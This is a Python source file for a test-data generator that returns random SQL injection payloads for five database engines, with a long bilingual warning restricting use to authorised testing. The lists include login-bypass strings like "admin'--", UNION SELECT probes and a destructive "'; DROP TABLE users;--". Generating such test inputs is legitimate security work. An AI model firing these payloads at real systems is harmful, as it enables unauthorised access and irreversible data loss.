from ...core.generator import GenerationContext, GeneratorType

"""
SQL注入Payload生成器

⚠️ **CRITICAL SECURITY WARNING / 重要安全警告** ⚠️

This generator creates SQL injection attack payloads for AUTHORIZED SECURITY
TESTING ONLY. Unauthorized use is ILLEGAL and may result in:

本生成器创建SQL注入攻击载荷，仅用于授权安全测试。未经授权的使用是非法的，可能导致：

LEGAL CONSEQUENCES / 法律后果:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 U.S.: Computer Fraud and Abuse Act (CFAA) - Up to 10 years imprisonment
🚨 China: Criminal Law Article 285/286 - 刑法第285/286条 - 最高7年有期徒刑
🚨 EU: Directive 2013/40/EU - Criminal penalties including imprisonment
🚨 Civil liability: Damages, injunctions, attorney fees
🚨 Professional consequences: Loss of certifications, employment termination
🚨 Database destruction: Potential for irreversible data loss

AUTHORIZED USE ONLY / 仅限授权使用:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Written authorization from system owner / 系统所有者的书面授权
✅ Penetration testing engagement with signed contract / 有签约的渗透测试项目
✅ Bug bounty programs with clear scope / 明确范围的漏洞赏金计划
✅ Educational lab environments (isolated, non-production) / 教育实验环境（隔离、非生产）
✅ Personal test databases you own / 您拥有的个人测试数据库

PROHIBITED USES / 禁止用途:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
❌ Testing production databases without authorization / 未经授权测试生产数据库
❌ Unauthorized data extraction or modification / 未经授权的数据提取或修改
❌ Database destruction (DROP TABLE, etc.) on live systems / 在生产系统上执行破坏操作
❌ Circumventing authentication without permission / 未经许可规避身份验证
❌ Any use that violates laws or regulations / 任何违反法律法规的用途

RESPONSIBILITY / 责任声明:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
By using this tool, you acknowledge that:
使用此工具即表示您确认：
- You have proper authorization for all testing activities / 您对所有测试活动拥有适当授权
- You understand and accept all legal risks / 您理解并接受所有法律风险
- You will use this tool ethically and responsibly / 您将道德且负责任地使用此工具
- You understand the potential for data loss / 您理解数据丢失的潜在风险
- The authors/maintainers are not liable for misuse / 作者/维护者不对滥用负责

提供多种数据库类型的SQL注入测试payload用于安全测试和漏洞研究
"""

import secrets
from typing import Optional

from dataforge.core.factory import register_generator
from dataforge.core.generator import DataGenerator, GeneratorConfig


class SQLInjectionGenerator(DataGenerator):
    """SQL注入测试payload生成器"""

    def __init__(self, config: Optional[GeneratorConfig] = None):
        # 提供默认配置
        default_config = GeneratorConfig(
            generator_type="security",
            parameters={}
        )
        super().__init__(config or default_config)
        self._setup()

    def _setup(self) -> None:
        """初始化设置"""
        self.supported_databases = ['mysql', 'postgresql', 'sqlserver', 'oracle', 'sqlite']
        self.database = self.parameters.get('database', 'mysql')
        self.payload_type = self.parameters.get('payload_type', 'basic')

    @property
    def generator_type(self) -> GeneratorType:
        """生成器类型"""
        return GeneratorType.ADVANCED

    @property
    def supported_parameters(self) -> list[str]:
        """支持的参数列表"""
        return ["database", "payload_type"]

    def _generate_raw(self, context=None) -> str:
        """生成单个SQL注入payload"""
        # 基础注入payload模板
        payloads = {
            'mysql': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "'; DROP TABLE users;--",
                "admin'--",
                "1' OR '1'='1"
            ],
            'postgresql': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "'; DROP TABLE users;--",
                "admin'--"
            ],
            'sqlserver': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "'; DROP TABLE users;--",
                "admin'--"
            ],
            'oracle': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT 1,2,3 FROM dual--",
                "admin'--"
            ],
            'sqlite': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT 1,2,3--",
                "admin'--"
            ]
        }

        if self.database not in payloads:
            self.database = 'mysql'

        available_payloads = payloads[self.database]
        return secrets.choice(available_payloads)

    def validate(self, data: str) -> bool:
        """验证payload是否为有效的SQL注入测试字符串"""
        if not isinstance(data, str):
            return False

        sql_keywords = ['OR', 'AND', 'UNION', 'SELECT', 'DROP', 'SLEEP']
        return any(keyword in data.upper() for keyword in sql_keywords)

    # 额外的高级方法
    def generate_payload(self, database: str = "", payload_type: str = "") -> str:
        """生成指定类型的payload"""
        old_db = self.database
        old_type = self.payload_type

        if database:
            self.database = database
        if payload_type:
            self.payload_type = payload_type

        result = self._generate_raw()

        self.database = old_db
        self.payload_type = old_type

        return result

    def get_supported_databases(self) -> list[str]:
        """获取支持的数据库类型列表"""
        return self.supported_databases



    def generate_single(self, context: Optional[GenerationContext] = None) -> str:
        """生成单个数据项"""
        # 尝试调用现有方法
        if hasattr(self, 'generate') and callable(self.generate):
            return self.generate(context)
        elif hasattr(self, '_generate_raw') and callable(self._generate_raw):
            return self._generate_raw(context)
        else:
            # 基本实现
            return "generated_data"


@register_generator("sql_injection", ["sql", "sqli", "sql_payload"])
class GenericSQLInjectionGenerator(SQLInjectionGenerator):
    """通用SQL注入Payload生成器"""
    
    def generate_single(self, context: Optional[GenerationContext] = None) -> str:
        """生成单个数据项"""
        return self._generate_raw()
